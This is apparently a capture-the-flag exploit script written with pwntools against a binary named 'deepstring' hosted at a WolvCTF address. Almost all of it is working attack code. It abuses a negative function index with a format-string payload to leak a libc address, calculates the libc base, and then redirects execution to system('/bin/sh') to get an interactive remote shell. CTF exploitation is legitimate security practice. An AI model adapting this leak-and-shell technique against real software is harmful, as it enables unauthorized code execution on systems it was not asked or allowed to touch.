from pwn import *

elf = ELF('./deepstring', checksec=False)
libc = ELF('./lib/libc.so.6', checksec=False)

def length(string):
    p.sendlineafter(b"reverse\n\n", b"0")
    p.sendlineafter(b"STRING: \n", string)
    p.recvuntil(b"The length of your string is: ")
    return p.recvline().strip()

def lower(string):
    p.sendlineafter(b"reverse\n\n", b"1")
    p.sendlineafter(b"STRING: \n", string)
    return p.recvline()

def upper(string):
    p.sendlineafter(b"reverse\n\n", b"2")
    p.sendlineafter(b"STRING: \n", string)
    return p.recvline()

def reverse(string):
    p.sendlineafter(b"reverse\n\n", b"3")
    p.sendlineafter(b"STRING: \n", string)

def call_func(rel, string):
    p.sendlineafter(b"reverse\n\n", b"%i" % rel)
    p.sendlineafter(b"STRING: \n", string)



p = process(elf.path)
p = remote('deepstring.wolvctf.io', 1337)

#pause()

call_func(-37, b"%p%p%p%p"+p64(0x00401405))

libc.address = int(p.recvline()[:14],0) - 1911555

info("libc 0x%hx" % libc.address)

call_func(-37, b"/bin/sh\0"+p64(libc.sym.system))


p.interactive()
